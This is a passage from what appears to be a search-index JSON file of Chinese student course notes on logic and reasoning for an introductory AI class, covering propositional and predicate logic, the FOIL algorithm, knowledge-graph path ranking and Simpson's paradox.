\u53cc\u91cd\u5426\u5b9a double-negation elimation \u5355\u9879\u6d88\u89e3\u6216\u5355\u9879\u5f52\u7ed3 unit resolution\uff1a \\(\\alpha\\vee\\beta,\\neg\\beta\\Rightarrow\\alpha\\) \u6d88\u89e3\u6216\u5f52\u7ed3 resolution\uff1a \\(\\alpha\\vee\\beta,\\neg\\beta\\vee\\gamma\\Rightarrow\\alpha\\vee\\gamma\\) \u8303\u5f0f\uff08normal form\uff09\u662f\u628a\u547d\u9898\u516c\u5f0f\u5316\u4e3a\u4e00\u79cd\u6807\u51c6\u7684\u5f62\u5f0f\uff0c\u4f5c\u7528\u662f\u53ef\u4ee5\u8fdb\u884c\u4e24\u4e2a\u547d\u9898\u7684\u7b49\u4ef7\u5224\u65ad \u6790\u53d6\u8303\u5f0f disjunctive normal form\uff08DNF\uff09\uff1a\u6709\u9650\u4e2a\u7b80\u5355\u5408\u53d6\u5f0f\u6784\u6210\u7684\u6790\u53d6\u5f0f\u79f0\u4e3a\u6790\u53d6\u8303\u5f0f \u5408\u53d6\u8303\u5f0f conjunctive normal form\uff08CNF\uff09\uff1a\u6709\u9650\u4e2a\u7b80\u5355\u6790\u53d6\u5f0f\u6784\u6210\u7684\u5408\u53d6\u5f0f\u79f0\u4e3a\u5408\u53d6\u8303\u5f0f \u4e00\u4e2a DNF \u4e0d\u6210\u7acb\u5f53\u4e14\u4ec5\u5f53\u6bcf\u4e2a\u7b80\u5355\u5408\u53d6\u5f0f\u90fd\u4e0d\u6210\u7acb \u4e00\u4e2a CNF \u6210\u7acb\u5f53\u4e14\u4ec5\u5f53\u6bcf\u4e2a\u7b80\u5355\u6790\u53d6\u5f0f\u90fd\u6210\u7acb \u547d\u9898\u516c\u5f0f\u7684 DNF \u548c CNF \u90fd\u662f\u4e0d\u552f\u4e00\u7684 \u8c13\u8bcd\u903b\u8f91 \u00b6 \u547d\u9898\u903b\u8f91\u65e0\u6cd5\u8868\u8fbe\u5c40\u90e8\u4e0e\u6574\u4f53\u3001\u4e00\u822c\u4e0e\u4e2a\u522b\u7684\u5173\u7cfb \u5c06\u539f\u5b50\u547d\u9898\u8fdb\u4e00\u6b65\u7ec6\u5316\uff0c\u5206\u89e3\u51fa\u4e2a\u4f53\u3001\u8c13\u8bcd\u548c\u91cf\u8bcd\uff0c\u6765\u8868\u8fbe\u4e2a\u4f53\u4e0e\u603b\u4f53\u7684\u5185\u5728\u8054\u7cfb\u548c\u6570\u91cf\u5173\u7cfb\uff0c\u5c31\u662f\u8c13\u8bcd\u903b\u8f91\uff08predicate logic\uff09\u7684\u7814\u7a76\u5185\u5bb9 \u4e2a\u4f53\uff1a\u4e2a\u4f53\u5f0f\u6307\u6240\u7814\u7a76\u9886\u57df\u4e2d\u53ef\u4ee5\u72ec\u7acb\u5b58\u5728\u7684\u5177\u4f53\u6216\u62bd\u8c61\u7684\u6982\u5ff5 \u5177\u4f53\u3001\u7279\u5b9a -> \u4e2a\u4f53\u5e38\u91cf\uff1b\u62bd\u8c61\u3001\u6cdb\u6307 -> \u4e2a\u4f53\u53d8\u91cf \u89c4\u5b9a\uff0c\u7528\u5c0f\u5199\u5b57\u6bcd \\(a\\) \u81f3 \\(w\\) \u8868\u793a\u4e2a\u4f53\u5e38\u91cf\uff08 \\(x,y,z\\) \u8868\u793a\u4e2a\u4f53\u53d8\u91cf\uff09 \u4e2a\u4f53\u7684\u53d6\u503c\u8303\u56f4\u79f0\u4e3a\u4e2a\u4f53\u57df \u8c13\u8bcd\uff1a\u8c13\u8bcd\u662f\u7528\u6765\u523b\u753b\u4e2a\u4f53\u5c5e\u6027\u6216\u8005\u63cf\u8ff0\u4e2a\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb\u5b58\u5728\u6027\u7684\u5143\u7d20\uff0c\u5176\u503c\u4e3a\u771f\u6216\u5047 \u5305\u542b\u4e00\u4e2a\u53c2\u6570\u7684\u8c13\u8bcd\u79f0\u4e3a\u4e00\u5143\u8c13\u8bcd\uff0c\u8868\u793a\u4e00\u5143\u5173\u7cfb \u5305\u542b\u591a\u4e2a\u53c2\u6570\u7684\u8c13\u8bcd\u79f0\u4e3a\u591a\u5143\u8c13\u8bcd\uff0c\u8868\u793a\u4e2a\u4f53\u95f4\u7684\u591a\u5143\u5173\u7cfb \u89c4\u5b9a\uff0c\u7528 \\(A(\\cdots)\\) \u81f3 \\(Z(\\cdots)\\) \u8868\u793a\u8c13\u8bcd\uff0c\u4e3a\u5927\u5199\u5b57\u6bcd\u540e\u8ddf\u62ec\u53f7\uff0c\u62ec\u53f7\u5185\u653e\u7f6e\u4e2a\u4f53\u5e38\u91cf\u6216\u53d8\u91cf \u91cf\u8bcd\uff1a\u5168\u79f0\u91cf\u8bcd\u548c\u5b58\u5728\u91cf\u8bcd\u7edf\u79f0\u4e3a\u91cf\u8bcd \u5168\u79f0\u91cf\u8bcd\uff1a\u8868\u793a\u4e00\u5207\u7684\u3001\u6240\u6709\u7684\u3001\u51e1\u4e8b\u3001\u6bcf\u4e00\u4e2a\u7b49\uff0c\u7b26\u53f7 \\(\\forall\\) \u5b58\u5728\u91cf\u8bcd\uff1a\u8868\u793a\u5b58\u5728\u3001\u6709\u4e00\u4e2a\u3001\u67d0\u4e9b\u7b49\uff0c\u7b26\u53f7 \\(\\exist\\) \u5168\u79f0\u91cf\u8bcd\u7684\u63cf\u8ff0\u6027\u662f\u53ef\u4ee5\u7528\u76f8\u5e94\u7684\u5b58\u5728\u91cf\u8bcd\u7684\u85d0\u89c6\u5f62\u5f0f\u66ff\u6362 \u7ea6\u675f\u53d8\u5143\uff1a\u5728\u5168\u79f0\u91cf\u8bcd\u6216\u5b58\u5728\u91cf\u8bcd\u7ea6\u675f\u6761\u4ef6\u4e0b\u7684\u53d8\u91cf\u7b26\u53f7 \u81ea\u7531\u53d8\u5143\uff1a\u4e0d\u53d7\u5168\u79f0\u91cf\u8bcd\u6216\u5b58\u5728\u91cf\u8bcd\u7ea6\u675f\u7684\u53d8\u91cf\u7b26\u53f7 \u5b9a\u7406\uff1a\u81ea\u7531\u53d8\u5143\u65e2\u53ef\u4ee5\u5b58\u5728\u4e8e\u91cf\u8bcd\u7684\u7ea6\u675f\u8303\u56f4\u4e4b\u5185\uff0c\u4e5f\u53ef\u4ee5\u5b58\u5728\u4e8e\u91cf\u8bcd\u7ea6\u675f\u8303\u56f4\u4e4b\u5916\uff0c\u5373\uff1a \\((\\forall x)(A(x)\\vee B)\\equiv(\\forall x)A(x)\\vee B\\) \\((\\forall x)(A(x)\\wedge B)\\equiv(\\forall x)A(x)\\wedge B\\) \\((\\exist x)(A(x)\\vee B)\\equiv(\\exist x)A(x)\\vee B\\) \\((\\exist x)(A(x)\\wedge B)\\equiv(\\exist x)A(x)\\wedge B\\) \u5b9a\u7406\uff1a\u5728\u7ea6\u675f\u53d8\u5143\u76f8\u540c\u7684\u6761\u4ef6\u4e0b\uff0c\u91cf\u8bcd\u7684\u8fd0\u7b97\u6ee1\u8db3\u5206\u914d\u7387 \u5b9a\u7406\uff1a\u5f53\u516c\u5f0f\u4e2d\u5b58\u5728\u591a\u4e2a\u91cf\u8bcd\u65f6\uff0c\u82e5\u591a\u4e2a\u91cf\u8bcd\u90fd\u662f\u5168\u79f0\u91cf\u8bcd\u6216\u8005\u90fd\u662f\u5b58\u5728\u91cf\u8bcd\uff0c\u5219\u91cf\u8bcd\u4f4d\u7f6e\u53ef\u4ee5\u4e92\u6362\uff1b\u82e5\u591a\u4e2a\u91cf\u8bcd\u4e2d\u65e2\u6709\u5168\u79f0\u91cf\u8bcd\u53c8\u6709\u5b58\u5728\u91cf\u8bcd\uff0c\u5219\u91cf\u8bcd\u4f4d\u7f6e\u4e0d\u53ef\u4ee5\u968f\u610f\u4e92\u6362 \u8c13\u8bcd\u903b\u8f91\uff1a \u53ea\u5305\u542b\u4e2a\u4f53\u8c13\u8bcd\u548c\u4e2a\u4f53\u91cf\u8bcd\u7684\u8c13\u8bcd\u903b\u8f91\u79f0\u4e3a\u4e00\u9636\u8c13\u8bcd\u903b\u8f91\uff0c\u65e0\u6cd5\u5bf9\u8c13\u8bcd\u548c\u91cf\u8bcd\u8fdb\u884c\u91cf\u5316 \u9700\u8981\u9ad8\u9636\u8c13\u8bcd\u548c\u9ad8\u9636\u91cf\u8bcd\u8fdb\u884c\u91cf\u5316\uff0c\u5305\u542b\u9ad8\u9636\u8c13\u8bcd\u548c\u9ad8\u9636\u91cf\u8bcd\u7684\u8c13\u8bcd\u903b\u8f91\u79f0\u4e3a\u9ad8\u9636\u8c13\u8bcd\u903b\u8f91 \u9879\uff1a\u9879\u662f\u63cf\u8ff0\u5bf9\u8c61\u7684\u903b\u8f91\u8868\u8fbe\u5f0f\uff0c\u9012\u5f52\u5b9a\u4e49\uff1a \u5e38\u91cf\u7b26\u53f7\u548c\u53d8\u91cf\u7b26\u53f7\u662f\u9879 \u82e5 \\(f(x_1, x_2,\\cdots, x_n)\\) \u662f \\(n\\) \u5143\u51fd\u6570\u7b26\u53f7\uff0c \\(t_1, t_2, \\cdots, t_n\\) \u662f\u9879\uff0c\u5219 \\(f(t_1, t_2, \\cdots, t_n)\\) \u662f\u9879 \u6709\u9650\u6b21\u6570\u5730\u4f7f\u7528\u4e0a\u8ff0\u89c4\u5219\u4ea7\u751f\u7684\u7b26\u53f7\u4e32\u662f\u9879 \u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\uff1a\u82e5 \\(P(x_1, x_2, \\cdots, x_n)\\) \u662f \\(n\\) \u5143\u8c13\u8bcd\uff0c \\(t_1, t_2, \\cdots, t_n\\) \u662f\u9879\uff0c\u5219\u79f0 \\(P(t_1, t_2, \\cdots, t_n)\\) \u4e3a\u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\uff0c\u7b80\u79f0\u539f\u5b50\u516c\u5f0f \u5408\u5f0f\u516c\u5f0f\uff1a\u7531\u903b\u8f91\u8054\u7ed3\u8bcd\u548c\u539f\u5b50\u516c\u5f0f\u6784\u6210\u7684\u7528\u4e8e\u9648\u8ff0\u4e8b\u5b9e\u7684\u590d\u6742\u8bed\u53e5\uff0c\u53c8\u79f0\u8c13\u8bcd\u516c\u5f0f\uff1a \u547d\u9898\u5e38\u9879\uff0c\u547d\u9898\u53d8\u9879\uff0c\u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\u90fd\u662f\u5408\u5f0f\u516c\u5f0f \u901a\u8fc7\u903b\u8f91\u8054\u7ed3\u8bcd\u8054\u7ed3\u5408\u5f0f\u516c\u5f0f\u5f97\u5230\u7684\u4e5f\u662f\u5408\u5f0f\u516c\u5f0f \u5982\u679c \\(A\\) \u662f\u5408\u5f0f\u516c\u5f0f\uff0c \\(x\\) \u662f\u4e2a\u4f53\u53d8\u9879\uff0c\u5219 \\((\\exist x)A(x), (\\forall x)A(x)\\) \u4e5f\u662f\u5408\u5f0f\u516c\u5f0f \u6709\u9650\u6b21\u6570\u5730\u4f7f\u7528\u4e0a\u8ff0\u89c4\u5219 \u63a8\u7406\u89c4\u5219\uff08 \\(A(x)\\) \u662f\u8c13\u8bcd\u516c\u5f0f\uff0c \\(x\\) \u548c \\(y\\) \u662f\u53d8\u5143\uff0c \\(a\\) \u662f\u5e38\u91cf\u7b26\u53f7\uff09 \u5168\u79f0\u91cf\u8bcd\u6d88\u53bb universal instantiation\uff08UI\uff09\uff1a \\((\\forall x)A(x)\\Rightarrow A(y)\\) \u5168\u79f0\u91cf\u8bcd\u5f15\u5165 universal generalization\uff08UG\uff09\uff1a \\(A(y)\\Rightarrow(\\forall x)A(x)\\) \u5b58\u5728\u91cf\u8bcd\u6d88\u53bb existential instantiation\uff08EI\uff09\uff1a \\((\\exist x)A(x)\\Rightarrow A(a)\\) \u5b58\u5728\u91cf\u8bcd\u5f15\u5165 existential generalization\uff08EG\uff09\uff1a \\(A(a)\\Rightarrow(\\exist x)A(x)\\) \u77e5\u8bc6\u56fe\u8c31\u63a8\u7406 \u00b6 \u77e5\u8bc6\u56fe\u8c31\uff08knowledge graph\uff09\u7531\u6709\u5411\u56fe\uff08directed graph\uff09\u6784\u6210\uff0c\u88ab\u7528\u6765\u63cf\u8ff0\u73b0\u5b9e\u4e16\u754c\u4e2d\u5b9e\u4f53\u53ca\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb \u4e24\u4e2a\u8282\u70b9\u548c\u8fde\u63a5\u8fb9\u53ef\u8868\u793a\u4e3a\u5f62\u5982 <left_node, relation, right_node> \u7684\u4e09\u5143\u7ec4\u5f62\u5f0f\uff0c\u4e5f\u53ef\u8868\u793a\u4e3a\u4e00\u9636\u903b\u8f91\uff08fisrt order logic\uff0cFOL\uff09\u7684\u5f62\u5f0f \u5173\u7cfb\u63a8\u7406\u662f\u7edf\u8ba1\u5173\u7cfb\u5b66\u4e60\u7814\u7a76\u7684\u57fa\u672c\u95ee\u9898\uff0c\u4e5f\u662f\u5f53\u524d\u77e5\u8bc6\u56fe\u8c31\u9886\u57df\u7814\u7a76\u7684\u70ed\u70b9\u95ee\u9898 \u5f52\u7eb3\u903b\u8f91\u7a0b\u5e8f\u8bbe\u8ba1\uff08inductive logic programming\uff0cILP\uff09 ILP \u662f\u673a\u5668\u5b66\u4e60\u548c\u903b\u8f91\u7a0b\u5e8f\u8bbe\u8ba1\u4ea4\u53c9\u9886\u57df\u7684\u7814\u7a76\u5185\u5bb9 ILP \u4f7f\u7528\u4e00\u9636\u8c13\u8bcd\u903b\u8f91\u8fdb\u884c\u77e5\u8bc6\u8868\u793a\uff0c\u901a\u8fc7\u4fee\u6539\u548c\u6269\u5145\u903b\u8f91\u8868\u8fbe\u5f0f\u5bf9\u73b0\u6709\u77e5\u8bc6\u8fdb\u884c\u5f52\u7eb3\uff0c\u5b8c\u6210\u63a8\u7406\u5185\u5bb9 FOIL\uff08first order inductive learner\uff09\u7b97\u6cd5\u662f ILP \u7684\u4ee3\u8868\u6027\u65b9\u6cd5\uff0c\u901a\u8fc7 \u5e8f\u8d2f\u8986\u76d6 \u5b66\u4e60\u63a8\u7406\u89c4\u5219 \u8def\u5f84\u6392\u5e8f\u7b97\u6cd5\uff08path ranking algorithm\uff0cGRA\uff09 \u5c06\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u8054\u8def\u5f84\u4f5c\u4e3a\u7279\u5f81\uff0c\u6765\u5b66\u4e60\u76ee\u6807\u5173\u7cfb\u7684\u5206\u7c7b\u5668 \u6d41\u7a0b\uff1a \u7279\u5f81\u62bd\u53d6\uff1a\u751f\u6210\u5e76\u9009\u62e9\u8def\u5f84\u7279\u5f81\u96c6\u5408\u3002\u751f\u6210\u8def\u5f84\u65b9\u6cd5\uff1a\u968f\u673a\u6e38\u8d70\uff08random walk\uff09\u3001BFS\u3001DFS \u7279\u5f81\u8ba1\u7b97\uff1a\u8ba1\u7b97\u6bcf\u4e2a\u8bad\u7ec3\u6837\u4f8b\u7684\u7279\u5f81\u503c \\(P(s\\rightarrow t; \\pi_j)\\) \uff0c\u8868\u793a\u4ece\u5b9e\u4f53\u8282\u70b9 \\(s\\) \u51fa\u53d1\uff0c\u901a\u8fc7\u5173\u7cfb\u8def\u5f84 \\(\\pi_j\\) \u8fbe\u5230\u5b9e\u4f53\u8282\u70b9 \\(t\\) \u7684\u6982\u7387\u3002\u6216\u8868\u793a\u662f\u5426\u5b58\u5728\u8fd9\u6837\u4e00\u6761\u8def\u5f84\uff0c\u6216\u8868\u793a\u8def\u5f84\u51fa\u73b0\u7684\u9891\u6b21\u9891\u7387 \u5206\u7c7b\u5668\u8bad\u7ec3\uff1a\u6839\u636e\u8bad\u7ec3\u6837\u4f8b\u7279\u5f81\u503c\uff0c\u4e3a\u76ee\u6807\u5173\u7cfb\u8bad\u7ec3\u5206\u7c7b\u5668\u3002\u8bad\u7ec3\u540e\u53ef\u7528\u4e8e\u63a8\u7406\u4e24\u4e2a\u5b9e\u4f53\u95f4\u662f\u5426\u5b58\u5728\u76ee\u6807\u5173\u7cfb FOIL \u7b97\u6cd5 \u00b6 \u7b97\u6cd5\u5185\u5bb9 \u8f93\u5165\uff1a\u76ee\u6807\u8c13\u8bcd \\(P\\) \uff0c\u76ee\u6807\u8c13\u8bcd \\(P\\) \u7684\u8bad\u7ec3\u6837\u4f8b\uff08\u6b63\u4f8b\u96c6\u5408 \\(E^+\\) \u548c\u53cd\u4f8b\u96c6\u5408 \\(E^-\\) \uff09\uff0c\u4ee5\u53ca\u5176\u5b83\u80cc\u666f\u77e5\u8bc6\u6837\u4f8b \u8f93\u51fa\uff1a\u53ef\u5f97\u5230\u76ee\u6807\u8c13\u8bcd\u8fd9\u4e00\u7ed3\u8bba\u7684\u63a8\u7406\u89c4\u5219 \u8fc7\u7a0b\uff1a \u5c06\u76ee\u6807\u8c13\u8bcd\u4f5c\u4e3a\u6240\u5b66\u4e60\u63a8\u7406\u89c4\u5219\u7684\u7ed3\u8bba \u5c06\u5176\u5b83\u8c13\u8bcd\u9010\u4e00\u4f5c\u4e3a \u524d\u63d0\u7ea6\u675f\u8c13\u8bcd \u52a0\u5165\u63a8\u7406\u89c4\u5219\uff0c\u8ba1\u7b97\u6240\u5f97\u5230\u63a8\u7406\u89c4\u5219\u7684 FOIL \u4fe1\u606f\u589e\u76ca\u503c\uff0c\u9009\u53d6\u53ef\u5e26\u6765\u6700\u5927\u4fe1\u606f\u589e\u76ca\u503c\u7684\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u52a0\u5165\u539f\u6765\u7684\u63a8\u7406\u89c4\u5219\uff0c\u5f97\u5230\u65b0\u7684\u63a8\u7406\u89c4\u5219\uff0c\u5e76\u5c06\u8bad\u7ec3\u6837\u4f8b\u96c6\u5408\u4e2d\u4e0e\u8be5\u63a8\u7406\u89c4\u5219\u4e0d\u7b26\u7684\u6837\u4f8b\u53bb\u6389 \u91cd\u590d b. \u8fc7\u7a0b\uff0c\u77e5\u9053\u6240\u5f97\u5230\u7684\u63a8\u7406\u89c4\u5219\u4e0d\u8986\u76d6\u4efb\u4f55\u53cd\u4f8b \u76ee\u6807\u8c13\u8bcd\u662f\u9700\u8981\u63a8\u65ad\u89c4\u5219\u7684\u7ed3\u8bba\uff0c\u4e5f\u79f0\u4e3a\u89c4\u5219\u5934 \u7ed9\u5b9a\u63a8\u7406\u7ed3\u8bba\u540e\uff0cFOIL \u7b97\u6cd5\u5b66\u4e60\u5f97\u5230\u4f7f\u5f97\u7ed3\u8bba\u6ee1\u8db3\u7684\u524d\u63d0\u6761\u4ef6\uff0c\u5373\u76ee\u6807\u8c13\u8bcd\u4f5c\u4e3a\u7ed3\u8bba\u7684\u63a8\u7406\u89c4\u5219 FOIL \u7b97\u6cd5\u4ece\u4e00\u822c\u5230\u7279\u6b8a\uff0c\u9010\u6b65\u6dfb\u52a0\u76ee\u6807\u8c13\u8bcd\u7684\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\uff0c\u76f4\u5230\u6240\u6784\u6210\u7684\u63a8\u7406\u89c4\u5219\u4e0d\u8986\u76d6\u4efb\u4f55\u53cd\u4f8b \u6dfb\u52a0\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u540e\u6240\u5f97\u7684\u63a8\u7406\u89c4\u5219\u7684\u8d28\u91cf\u7684\u597d\u574f\u7531\u4fe1\u606f\u589e\u76ca\u503c\uff08information gain\uff09\u4f5c\u4e3a\u8bc4\u4f30\u6807\u51c6\uff0c\u8ba1\u7b97\u65b9\u6cd5\uff1a \\[ \\mathrm{FOIL\\_Gain} = \\widehat{m_+}\\cdot\\left(\\log_2\\frac{\\widehat{m_+}}{\\widehat{m_+}+\\widehat{m_-}}-\\log_2\\frac{m_+}{m_++m_-}\\right) \\] \\(\\widehat{m_+}, \\widehat{m_-}\\) \u662f\u589e\u52a0\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u540e\u5f97\u5230\u7684\u65b0\u63a8\u7406\u89c4\u5219\u80fd\u8986\u76d6\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b\u6570\u76ee \\(m_+, m_-\\) \u662f\u539f\u63a8\u7406\u89c4\u5219\u8986\u76d6\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b\u6570\u76ee \u56e0\u679c\u63a8\u7406 \u00b6 \u56e0\u679c\u63a8\u7406\uff08causal inference\uff09\u662f\u6307\u4ece\u89c2\u5bdf\u5230\u7684\u6570\u636e\u4e2d\u63a8\u65ad\u51fa\u56e0\u679c\u5173\u7cfb\u7684\u8fc7\u7a0b \u8f9b\u666e\u68ee\u6096\u8bba \u67d0\u7ec4\u75c5\u4eba\uff0c\u4e0d\u7528\u836f\u7684\u6062\u590d\u7387\u5927\u4e8e\u7528\u836f\u7684\u6062\u590d\u7387\uff1b\u4f46\u5355\u72ec\u89c2\u5bdf\u7537\u6027\u548c\u5973\u6027\uff0c\u5747\u662f\u7528\u836f\u7684\u6062\u590d\u7387\u5927\u4e8e\u4e0d\u7528\u836f\u7684\u6062\u590d\u7387 \u8f9b\u666e\u68ee\u6096\u8bba\uff08Simpson's paradox\uff09\u662f\u6307\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u67d0\u4e2a\u53d8\u91cf\u7684\u603b\u4f53\u6548\u5e94\u4e0e\u5176\u5b50\u96c6\u7684\u6548\u5e94\u76f8\u53cd \u5373 \\(\\dfrac{b}{a}<\\dfrac{d}{c}, \\dfrac{b'}{a'}<\\dfrac{d'}{c'}, \\dfrac{b+b'}{a+a'}>\\dfrac{d+d'}{c+c'}\\) \u8f9b\u666e\u68ee\u6096\u8bba\u8868\u660e\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5ffd\u7565\u6f5c\u5728\u7684\u53d8\u91cf\u53ef\u80fd\u4f1a\u6539\u53d8\u5df2\u6709\u7ed3\u8bba \u7ed3\u6784\u56e0\u679c\u6a21\u578b\uff08structural causal model\uff0cSCM\uff09 \u6f5c\u5728\u7ed3\u679c\u5206\u6790\u6846\u67b6\uff08Rubin-Neyman Causal Model\uff09\u3001 \u540e\u9762\u5927\u6982\u662f\u4e00\u5927\u5806\uff0c\u542c\u4e0d\u61c2\u770b\u4e0d\u61c2\uff0c\u611f\u89c9\u4e0d\u91cd\u8981\uff0c\u5f00\u6446\uff08\uff1f","title":"\u903b\u8f91\u4e0e\u63a8\u7406"},{"location":"cs/ai/basic/topic1/#_1","text":"Abstract \u4eba\u5de5\u667a\u80fd\u57fa\u7840\u7b2c 2 \u81f3 4 \u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a \u300a\u4eba\u5de5\u667a\u80fd\u5bfc\u8bba\uff1a\u6a21\u578b\u4e0e\u7b97\u6cd5\u300b- \u5434\u98de","title":"\u903b\u8f91\u4e0e\u63a8\u7406"},{"location":"cs/ai/basic/topic1/#_2","text":"\u547d\u9898\u903b\u8f91\uff08proposition logic\uff09\u662f\u5e94\u7528\u4e00\u5957\u5f62\u5f0f\u5316\u89c4\u5219\u5bf9\u4ee5\u7b26\u53f7\u8868\u793a\u7684\u63cf\u8ff0\u6027\u9648\u8ff0\uff08\u79f0\u4e3a\u547d\u9898\uff09\u8fdb\u884c\u63a8\u7406\u7684\u7cfb\u7edf \u547d\u9898\u903b\u8f91\u4ee5\u539f\u5b50\u547d\u9898\u4f5c\u4e3a\u6700\u57fa\u672c\u7684\u5355\u4f4d\uff0c\u65e0\u6cd5\u5bf9\u539f\u5b50\u547d\u9898\u8fdb\u884c\u5206\u89e3\uff08\u5206\u79bb\u5176\u4e3b\u8bed\u4e0e\u8c13\u8bed\uff09 \u547d\u9898\u903b\u8f91\u662f\u6570\u7406\u903b\u8f91\u7684\u57fa\u7840 \u901a\u8fc7\u547d\u9898\u8054\u7ed3\u8bcd\uff08connectives\uff09\u5bf9\u5df2\u6709\u547d\u9898\u8fdb\u884c\u7ec4\u5408\uff0c\u5f97\u5230\u65b0\u547d\u9898\uff0c\u79f0\u4e3a\u7b26\u5408\u547d\u9898\uff08compound proposition\uff09 \u547d\u9898\u5408\u53d6 conjunction\uff0c \\(p\\wedge q\\) \u547d\u9898\u6790\u53d6 disjunction\uff0c \\(p\\vee q\\) \u547d\u9898\u5426\u5b9a negation\uff0c \\(\\neg p\\) \u547d\u9898\u8574\u542b implication\uff0c \\(p\\rightarrow q\\) \uff0c \\(p\\) \u4e3a\u524d\u4ef6\uff0c \\(q\\) \u4e3a\u540e\u4ef6 \u547d\u9898\u53cc\u5411\u8574\u542b bi-implication\uff0c \\(p\\leftrightarrow q\\) \u903b\u8f91\u7b49\u4ef7\uff1a\u5728\u6240\u6709\u60c5\u51b5\u4e0b\u90fd\u6709\u76f8\u540c\u771f\u5047\u7ed3\u679c \u9006\u5426\u547d\u9898\uff1a \\((\\alpha\\rightarrow\\beta)\\equiv\\neg\\beta\\rightarrow\\neg\\alpha\\) \u8574\u542b\u6d88\u9664\uff1a \\((\\alpha\\rightarrow\\beta)\\equiv\\neg\\alpha\\vee\\beta\\) \u53cc\u5411\u6d88\u9664\uff1a \\((\\alpha\\leftrightarrow\\beta)\\equiv(\\alpha\\rightarrow\\beta)\\wedge(\\beta\\rightarrow\\alpha)\\) ... \u63a8\u7406\uff1a\u6309\u7167\u67d0\u79cd\u7b56\u7565\u4ece\u524d\u63d0\u51fa\u53d1\u63a8\u51fa\u7ed3\u8bba\u7684\u8fc7\u7a0b\u3002\u5e38\u89c1\u63a8\u7406\u89c4\u5219\uff1a \u5047\u8a00\u63a8\u7406 modus ponens\uff1a \\(\\alpha\\rightarrow\\beta, \\alpha\\Rightarrow\\beta\\) \u4e0e\u6d88\u89e3 and-elimination\uff1a \\(\\alpha_1\\wedge\\alpha_2\\wedge\\cdots\\wedge\\alpha_n\\Rightarrow\\alpha_i(1\\leq i\\leq n)\\) \u4e0e\u5bfc\u5165 and-introduction\uff1a \\(\\alpha_1,\\alpha_2,\\cdots,\\alpha_n\\Rightarrow\\alpha_1\\wedge\\alpha_2\\wedge\\cdots\\wedge\\alpha_n\\) \u53cc\u91cd\u5426\u5b9a double-negation elimation \u5355\u9879\u6d88\u89e3\u6216\u5355\u9879\u5f52\u7ed3 unit resolution\uff1a \\(\\alpha\\vee\\beta,\\neg\\beta\\Rightarrow\\alpha\\) \u6d88\u89e3\u6216\u5f52\u7ed3 resolution\uff1a \\(\\alpha\\vee\\beta,\\neg\\beta\\vee\\gamma\\Rightarrow\\alpha\\vee\\gamma\\) \u8303\u5f0f\uff08normal form\uff09\u662f\u628a\u547d\u9898\u516c\u5f0f\u5316\u4e3a\u4e00\u79cd\u6807\u51c6\u7684\u5f62\u5f0f\uff0c\u4f5c\u7528\u662f\u53ef\u4ee5\u8fdb\u884c\u4e24\u4e2a\u547d\u9898\u7684\u7b49\u4ef7\u5224\u65ad \u6790\u53d6\u8303\u5f0f disjunctive normal form\uff08DNF\uff09\uff1a\u6709\u9650\u4e2a\u7b80\u5355\u5408\u53d6\u5f0f\u6784\u6210\u7684\u6790\u53d6\u5f0f\u79f0\u4e3a\u6790\u53d6\u8303\u5f0f \u5408\u53d6\u8303\u5f0f conjunctive normal form\uff08CNF\uff09\uff1a\u6709\u9650\u4e2a\u7b80\u5355\u6790\u53d6\u5f0f\u6784\u6210\u7684\u5408\u53d6\u5f0f\u79f0\u4e3a\u5408\u53d6\u8303\u5f0f \u4e00\u4e2a DNF \u4e0d\u6210\u7acb\u5f53\u4e14\u4ec5\u5f53\u6bcf\u4e2a\u7b80\u5355\u5408\u53d6\u5f0f\u90fd\u4e0d\u6210\u7acb \u4e00\u4e2a CNF \u6210\u7acb\u5f53\u4e14\u4ec5\u5f53\u6bcf\u4e2a\u7b80\u5355\u6790\u53d6\u5f0f\u90fd\u6210\u7acb \u547d\u9898\u516c\u5f0f\u7684 DNF \u548c CNF \u90fd\u662f\u4e0d\u552f\u4e00\u7684","title":"\u547d\u9898\u903b\u8f91"},{"location":"cs/ai/basic/topic1/#_3","text":"\u547d\u9898\u903b\u8f91\u65e0\u6cd5\u8868\u8fbe\u5c40\u90e8\u4e0e\u6574\u4f53\u3001\u4e00\u822c\u4e0e\u4e2a\u522b\u7684\u5173\u7cfb \u5c06\u539f\u5b50\u547d\u9898\u8fdb\u4e00\u6b65\u7ec6\u5316\uff0c\u5206\u89e3\u51fa\u4e2a\u4f53\u3001\u8c13\u8bcd\u548c\u91cf\u8bcd\uff0c\u6765\u8868\u8fbe\u4e2a\u4f53\u4e0e\u603b\u4f53\u7684\u5185\u5728\u8054\u7cfb\u548c\u6570\u91cf\u5173\u7cfb\uff0c\u5c31\u662f\u8c13\u8bcd\u903b\u8f91\uff08predicate logic\uff09\u7684\u7814\u7a76\u5185\u5bb9 \u4e2a\u4f53\uff1a\u4e2a\u4f53\u5f0f\u6307\u6240\u7814\u7a76\u9886\u57df\u4e2d\u53ef\u4ee5\u72ec\u7acb\u5b58\u5728\u7684\u5177\u4f53\u6216\u62bd\u8c61\u7684\u6982\u5ff5 \u5177\u4f53\u3001\u7279\u5b9a -> \u4e2a\u4f53\u5e38\u91cf\uff1b\u62bd\u8c61\u3001\u6cdb\u6307 -> \u4e2a\u4f53\u53d8\u91cf \u89c4\u5b9a\uff0c\u7528\u5c0f\u5199\u5b57\u6bcd \\(a\\) \u81f3 \\(w\\) \u8868\u793a\u4e2a\u4f53\u5e38\u91cf\uff08 \\(x,y,z\\) \u8868\u793a\u4e2a\u4f53\u53d8\u91cf\uff09 \u4e2a\u4f53\u7684\u53d6\u503c\u8303\u56f4\u79f0\u4e3a\u4e2a\u4f53\u57df 